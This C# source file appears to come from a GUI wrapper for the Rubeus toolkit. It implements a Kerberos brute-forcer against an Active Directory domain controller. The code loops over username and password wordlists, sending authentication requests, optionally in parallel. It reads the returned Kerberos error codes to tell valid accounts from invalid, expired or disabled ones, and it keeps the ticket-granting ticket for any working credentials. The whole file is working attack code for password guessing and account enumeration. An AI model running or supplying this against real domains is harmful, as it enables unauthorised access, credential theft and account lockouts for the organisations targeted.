using Rubeus;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace RubeusGui
{
    // Terrible name I know, but I needed to differentiate it from the built in BruteForcer class in Rubeus (modifying that one to suit the GUI was more hassle than just making this new one)
    public class GuiBruteForcer
    {

        public event EventHandler<BruteResult> ResultAdded;
        // Normal list of usernames we've already processed (no need for concurrent collection overhead if we're not using Parallel.ForEach)
        private List<string> _alreadyProcessedUsers;
        // Thread safe list of usernames we've already processed, for if we're using Parallel.ForEach
        private System.Collections.Concurrent.ConcurrentBag<string> _alreadyProcessedUsersParallel;
        private CancellationTokenSource _cancelToken;

        public void Cancel()
        {
            _cancelToken?.Cancel();
        }

        /// <summary>
        /// Returns true if it finished testing all usernames and passwords. Returns false if it was cancelled by user before completing
        /// </summary>
        public bool Run(string domain, string dc, List<string> usernames, List<string> passwords, bool runParallel)
        {
            _cancelToken = new CancellationTokenSource();
            if (runParallel)
            {
                _alreadyProcessedUsersParallel = new System.Collections.Concurrent.ConcurrentBag<string>();
                ParallelOptions options = new ParallelOptions();
                options.CancellationToken = _cancelToken.Token;
                try
                {
                    Parallel.ForEach(usernames, options, (username, loopState) =>
                    {
                        if (options.CancellationToken.IsCancellationRequested)
                        {
                            loopState.Stop();
                        }
                        // Avoid processing duplicate usernames in the wordlist (not really our problem but hey let's try to be helpful)
                        if (_alreadyProcessedUsersParallel.Contains(username))
                        {
                            return;
                        }
                        else
                        {
                            _alreadyProcessedUsersParallel.Add(username);
                            TestPasswords(domain, dc, username, passwords);
                        }
                    });
                }
                catch (OperationCanceledException)
                {
                    return false;
                }
                return true;
            }
            else // If not using multithreading
            {
                _alreadyProcessedUsers = new List<string>();
                foreach (string username in usernames)
                {
                    if (_cancelToken.IsCancellationRequested)
                    {
                        return false;
                    }
                    // Avoid processing duplicate usernames in the wordlist (not really our problem but hey let's try to be helpful)
                    if (_alreadyProcessedUsers.Contains(username))
                    {
                        continue;
                    }
                    else
                    {
                        _alreadyProcessedUsers.Add(username);
                        TestPasswords(domain, dc, username, passwords);
                    }
                }
                return true;
            }
        }

        private void TestPasswords(string domain, string dc, string username, List<string> passwords)
        {
            BruteResult result = new BruteResult(username);
            foreach (string password in passwords)
            {
                if (_cancelToken != null && _cancelToken.IsCancellationRequested)
                {
                    break;
                }
                bool tryMorePasswords = false;
                try
                {
                    try
                    {
                        Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                        string hash = Helpers.EncryptPassword(domain, username, password, etype);
                        byte[] tgtBytes = Ask.InnerTGT(AS_REQ.NewASReq(username, domain, hash, etype), etype, null, false, dc);
                        // If we made it this far then credentials must be valid
                        result.Password = password;
                        result.Status = BruteResult.CredentialStatus.UsernameAndPwdValid;
                        result.Tgt = tgtBytes;
                    }
                    catch (KerberosErrorException kerbEx)
                    {
                        // Most kerberos errors will only appear if the username is valid (other than C_PRINCIPAL_UNKNOWN) so if we're hitting this Catch block then assume the username is valid 

                        var errorInfo = (Interop.KERBEROS_ERROR)kerbEx.NativeKrbError.error_code;
                        switch (errorInfo)
                        {
                            // PREAUTH_FAILED is returned when we try an incorrect password with a valid username, so its the only scenario where we actually want to keep trying
                            // more passwords and not just record the error and skip to the next user
                            case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
                                tryMorePasswords = true;
                                result.Status = BruteResult.CredentialStatus.UsernameValid;
                                break;
                            case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                                result.Status = BruteResult.CredentialStatus.UsernameInvalid;
                                break;
                            case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
                                result.Password = password;
                                result.Status = BruteResult.CredentialStatus.UsernameAndPwdValidButPwdExpired;
                                break;
                            case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
                                result.Status = BruteResult.CredentialStatus.UsernameValidButDisabled;
                                break;
                            default:
                                // If we got any other kerberos error then the username is almost certainly valid as we did not get KDC_ERR_C_PRINCIPAL_UNKNOWN
                                result.Status = BruteResult.CredentialStatus.UsernameValid;
                                // Feels a bit janky throwing an exception here just to catch it a couple of lines later but I still prefer it over the alternatives
                                throw new RubeusException("Server responded with error code " + (int)errorInfo + " (" + errorInfo + ") - " + Helpers.GetFriendlyNameForKrbErrorCode(errorInfo));
                        }
                    }
                }
                catch (Exception ex) // Catch any general exceptions as well as any kerberos ones we re-threw above
                {
                    if (result.Status == BruteResult.CredentialStatus.UsernameValid)
                    {
                        result.Status = BruteResult.CredentialStatus.UsernameValidButError;
                    }
                    else
                    {
                        result.Status = BruteResult.CredentialStatus.Error;
                    }
                    result.ErrorMessage = ex.Message;
                }

                // If we got valid credentials or a fatal error for this user (disabled, unknown principal etc), don't try any more passwords and just skip to next user
                if (!tryMorePasswords)
                {
                    break;
                }
            } // End of password loop for this user

            ResultAdded?.Invoke(this, result);
        }

    }
}
